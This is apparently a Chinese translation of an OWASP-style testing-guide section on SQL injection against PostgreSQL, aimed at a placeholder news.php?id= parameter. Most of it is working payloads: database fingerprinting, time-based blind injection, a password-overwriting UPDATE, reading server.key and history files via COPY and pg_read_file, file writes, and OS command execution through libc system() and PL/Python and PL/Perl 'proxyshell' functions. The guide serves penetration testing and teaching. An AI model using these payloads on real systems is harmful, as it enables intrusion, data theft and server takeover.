# PostgreSQL

## 摘要

在本节中，将讨论一些针对 PostgreSQL 的 SQL 注入技术。这些技术具有以下特征：

- PHP 连接器允许通过 `;` 作为语句分隔符执行多条语句。
- SQL 语句可以通过追加注释符 `--` 截断。
- `LIMIT` 和 `OFFSET` 可用于 `SELECT` 语句中，以检索查询生成的结果集的一部分。

从现在起，假设 `https://www.example.com/news.php?id=1` 存在 SQL 注入攻击漏洞。

## 如何测试

### 识别 PostgreSQL

当发现 SQL 注入后，需要仔细对后端数据库引擎进行指纹识别。可以使用 `::` 类型转换运算符判断后端数据库引擎是否为 PostgreSQL。

```sql
id=1 AND 1::int=1
```

此外，`version()` 函数可用于获取 PostgreSQL 横幅。这还会显示底层操作系统的类型和版本。

```sql
id=1 UNION ALL SELECT NULL,version(),NULL LIMIT 1 OFFSET 1--
```

可能返回的横幅字符串示例：

```log
PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
```

### 盲注

对于盲 SQL 注入攻击，应考虑以下内置函数：

- 字符串长度  
  ```sql
  LENGTH(str)
  ```

- 从给定字符串提取子串  
  ```sql
  SUBSTRING(str,index,offset)
  ```

- 不使用单引号的字符串表示  
  ```sql
  CHR(104)||CHR(101)||CHR(108)||CHR(108)||CHR(111)
  ```

从 8.2 版本开始，PostgreSQL 引入了内置函数 `pg_sleep(n)`，使当前会话进程睡眠 `n` 秒。该函数可用于执行时间攻击（详见 [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)）。

此外，在旧版本中，可以使用 libc 轻松创建自定义 `pg_sleep(n)`：

```sql
CREATE function pg_sleep(int) RETURNS int AS '/lib/libc.so.6', 'sleep' LANGUAGE 'C' STRICT
```

### 单引号转义绕过

可以使用 `chr()` 函数对字符串进行编码，以绕过单引号转义。

- `chr(n)`：返回 ASCII 值对应数字 `n` 的字符
- `ascii(n)`：返回字符 `n` 对应的 ASCII 值

假设想编码字符串 'root'：

```sql
select ascii('r')
114
select ascii('o')
111
select ascii('t')
116
```

可以将 'root' 编码为：

```sql
chr(114)||chr(111)||chr(111)||chr(116)
```

示例

```sql
id=1; UPDATE users SET PASSWORD=chr(114)||chr(111)||chr(111)||chr(116)--
```

### 攻击向量

#### 当前用户

当前用户的身份可以通过以下 SQL SELECT 语句检索：

```sql
SELECT user
SELECT current_user
SELECT session_user
SELECT usename FROM pg_user
SELECT getpgusername()
```

##### 示例

```sql
id=1 UNION ALL SELECT user,NULL,NULL--

id=1 UNION ALL SELECT current_user, NULL, NULL--
```

#### 当前数据库

内置函数 `current_database()` 返回当前数据库名。

#### 读取文件

PostgreSQL 提供两种访问本地文件的方式：

- `COPY` 语句
- `pg_read_file()` 内部函数（从 PostgreSQL 8.1 开始）

##### COPY ... FROM ...

此运算符在文件和表之间复制数据。PostgreSQL 引擎以 `postgres` 用户身份访问本地文件系统。

示例

```sql
id=1; CREATE TABLE file_store(id serial, data text)--

id=1; COPY file_store(data) FROM '/var/lib/postgresql/.psql_history'--
```

应通过执行 `UNION Query SQL Injection` 获取数据：

- 检索之前通过 `COPY` 语句添加到 `file_store` 中的行数
- 使用 UNION SQL 注入一次检索一行

```sql
id=1 UNION ALL SELECT NULL, NULL, max(id)::text FROM file_store LIMIT 1 OFFSET 1;--

id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 1;--

id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 2;--
...
...
id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 11;--
```

##### pg_read_file()

该函数在 `PostgreSQL 8.1` 中引入，允许读取位于 DBMS 数据目录内的任意文件。

示例

```sql
SELECT pg_read_file('server.key',0,1000);
```

#### 写入文件 COPY ... TO ...

通过反转 COPY 语句，我们可以使用 `postgres` 用户权限写入本地文件系统。

```sql
id=1; COPY file_store(data) TO '/var/lib/postgresql/copy_output'--
```

#### Shell 注入

PostgreSQL 提供了一种机制，通过使用动态库和脚本语言（如 python、perl 和 tcl）添加自定义函数。

##### 动态库

在 PostgreSQL 8.1 之前，可以添加与 `libc` 链接的自定义函数：

```sql
CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT
```

由于 `system` 返回 `int`，我们如何从 `system` 的 stdout 获取结果？

这里有个小技巧：

- 创建 `stdout` 表：
    ```sql
    CREATE TABLE stdout(id serial, system_out text)
    ```
- 执行 shell 命令并重定向其 `stdout`
    ```sql
    SELECT system('uname -a > /tmp/test')
    ```
- 使用 `COPY` 语句将前一个命令的输出推入 `stdout` 表：
    ```sql
    COPY stdout(system_out) FROM '/tmp/test*'
    ```
- 从 `stdout` 检索输出：
    ```sql
    SELECT system_out FROM stdout
    ```

示例

```sql
id=1; CREATE TABLE stdout(id serial, system_out text) --
id=1; CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6','system' LANGUAGE 'C' STRICT --
id=1; SELECT system('uname -a > /tmp/test') --
id=1; COPY stdout(system_out) FROM '/tmp/test' --
id=1 UNION ALL SELECT NULL,(SELECT system_out FROM stdout ORDER BY id DESC),NULL LIMIT 1 OFFSET 1--
```

##### PL/Python

PL/Python 允许用户用 Python 编写 PostgreSQL 函数。它是不受信任的，因此无法限制用户可以做什么。默认未安装，可以通过 `CREATE LANGUAGE` 在给定数据库上启用。

- 检查 PL/Python 是否已在数据库上启用：
    ```sql
    SELECT count(*) FROM pg_language WHERE lanname='plpythonu'
    ```
- 如果未启用，尝试启用：
    ```sql
    CREATE LANGUAGE plpythonu
    ```
- 如果上述任一操作成功，创建代理 shell 函数：
    ```sql
    CREATE FUNCTION proxyshell(text) RETURNS text AS 'import os; return os.popen(args[0]).read()' LANGUAGE plpythonu
    ```
- 然后使用：
    ```sql
    SELECT proxyshell(os command);
    ```

示例

- 创建代理 shell 函数：
    ```sql
    id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS 'import os;return os.popen(args[0]).read()' LANGUAGE plpythonu;--
    ```
- 运行 OS 命令：
    ```sql
    id=1 UNION ALL SELECT NULL, proxyshell('whoami'), NULL OFFSET 1;--
    ```

##### PL/Perl

PL/Perl 允许我们使用 Perl 编写 PostgreSQL 函数。通常，它作为受信任语言安装，以禁用与底层操作系统交互的操作（如 `open`）的运行时执行。这样一来，就无法获得操作系统级访问权限。要成功注入类似 proxyshell 的函数，我们需要从 `postgres` 用户安装不受信任的版本，以避免所谓的受信任/不受信任操作的应用程序掩码过滤。

- 检查是否已启用 PL/Perl 不受信任版本：
    ```sql
    SELECT count(*) FROM pg_language WHERE lanname='plperlu'
    ```
- 如果未启用，假设系统管理员已经安装了 plperl 包，尝试：
    ```sql
    CREATE LANGUAGE plperlu
    ```
- 如果上述任一操作成功，创建代理 shell 函数：
    ```sql
    CREATE FUNCTION proxyshell(text) RETURNS text AS 'open(FD,"$_[0] |");return join("",<FD>);' LANGUAGE plperlu
    ```
- 然后使用：
    ```sql
    SELECT proxyshell(os command);
    ```

示例

- 创建代理 shell 函数：
    ```sql
    id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS 'open(FD,"$_[0] |");return join("",<FD>);' LANGUAGE plperlu;
    ```
- 运行 OS 命令：
    ```sql
    id=1 UNION ALL SELECT NULL, proxyshell('whoami'), NULL OFFSET 1;--
    ```
